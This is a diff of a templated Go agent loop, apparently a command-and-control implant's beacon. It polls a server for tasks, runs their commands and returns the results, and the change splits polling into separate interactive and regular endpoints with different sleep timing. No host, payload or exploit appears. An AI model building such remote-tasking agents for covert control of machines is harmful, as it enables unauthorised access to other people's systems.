@@ -36,34 +36,34 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 			continue
 		}
 
-		// Use the same approach for both interactive and regular modes - get tasks from the queued tasks API
-		// This ensures both regular and interactive tasks are handled with the proven working mechanism
-		tasks, err := a.{AGENT_GET_TASKS_FUNC}()
-		if err != nil {
-			// Failed to get tasks, increment failure counter
-			a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
-			time.Sleep(30 * time.Second)
-			continue
-		} else {
-			a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful communication
-		}
-
-		// Process all tasks (both regular and interactive)
-		for _, task := range tasks {
-			result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
-			taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
-			err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
-			if err != nil {
-				// Failed to submit task result
-				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
-			} else {
-				a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful result submission
-			}
-		}
-
-		// Use shorter sleep time in interactive mode for faster response
-		var sleepTime time.Duration
+		// Use different endpoints based on interactive mode
 		if a.{AGENT_INTERACTIVE_MODE_FIELD} {
+			// In interactive mode, get tasks from the interactive endpoint
+			interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
+			if err != nil {
+				// Failed to get interactive task, increment failure counter
+				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
+				time.Sleep(2 * time.Second) // Short sleep in interactive mode
+				continue
+			} else {
+				a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful communication
+			}
+
+			// Process interactive task if available
+			if interactiveTask != nil {
+				result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
+				taskIDStr := strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10)
+
+				// Submit result using interactive result endpoint
+				err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskIDStr, result)
+				if err != nil {
+					// Failed to submit interactive task result
+					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
+				} else {
+					a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful result submission
+				}
+			}
+
 			// Check interactive status every 10 iterations in interactive mode
 			interactiveCheckCount++
 			if interactiveCheckCount >= 10 {
@@ -74,9 +74,34 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 				}
 				interactiveCheckCount = 0 // Reset counter
 			}
+
 			// Short sleep for quick response in interactive mode
-			sleepTime = 2 * time.Second
+			time.Sleep(2 * time.Second)
 		} else {
+			// In regular mode, get tasks from the regular tasks endpoint
+			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
+			if err != nil {
+				// Failed to get tasks, increment failure counter
+				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
+				time.Sleep(30 * time.Second)
+				continue
+			} else {
+				a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful communication
+			}
+
+			// Process all regular tasks
+			for _, task := range tasks {
+				result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
+				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
+				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
+				if err != nil {
+					// Failed to submit task result
+					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
+				} else {
+					a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful result submission
+				}
+			}
+
 			// Check interactive status every 3 iterations in regular mode
 			regularCheckCount++
 			if regularCheckCount >= 3 {
@@ -86,8 +111,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 					if shouldBeInteractive {
 						a.{AGENT_INTERACTIVE_MODE_FIELD} = true
 					}
-				} else {
-					_ = err // Use the error variable to avoid unused variable warning
 				}
 				regularCheckCount = 0 // Reset counter
 			}
@@ -99,10 +122,9 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 			if sleepTimeFloat < 5 {
 				sleepTimeFloat = 5
 			}
-			sleepTime = time.Duration(sleepTimeFloat) * time.Second
+			sleepTime := time.Duration(sleepTimeFloat) * time.Second
+			time.Sleep(sleepTime)
 		}
-
-		time.Sleep(sleepTime)
 	}
 }
 
